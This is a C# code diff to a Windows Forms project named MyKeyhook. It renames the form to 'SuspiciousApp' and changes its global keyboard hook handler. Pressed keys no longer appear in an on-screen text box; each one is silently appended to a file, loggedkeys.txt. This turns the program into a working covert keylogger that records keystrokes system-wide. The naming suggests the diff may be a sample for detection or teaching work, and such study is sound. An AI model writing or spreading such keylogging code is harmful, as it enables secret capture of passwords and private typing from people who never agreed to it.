@@ -8,10 +8,11 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using Utilities;
+using System.IO;
 
 namespace MyKeyhook
 {
-    public partial class Form1 : Form
+    public partial class SuspiciousApp : Form
     {
         Boolean loggingKeys = false;
         Boolean f1 = false;
@@ -19,7 +20,8 @@ namespace MyKeyhook
         globalKeyboardHook logAllKeysHook;
         globalKeyboardHook checkShortcut;
 
-        public Form1()
+
+        public SuspiciousApp()
         {
             InitializeComponent();
             logAllKeysHook = new globalKeyboardHook();
@@ -83,7 +85,11 @@ namespace MyKeyhook
 
         void logAll_keyUp(object sender, KeyEventArgs e)
         {
-            myTxt.AppendText("Pressed\t" + e.KeyCode.ToString() + "\n");
+            
+            using (StreamWriter writetext = new StreamWriter("loggedkeys.txt", true))
+            {
+                writetext.WriteLine("Pressed\t" + e.KeyCode.ToString() + "\n");
+            }
         }
 
         void checkShortcut_down(object sender, KeyEventArgs e)
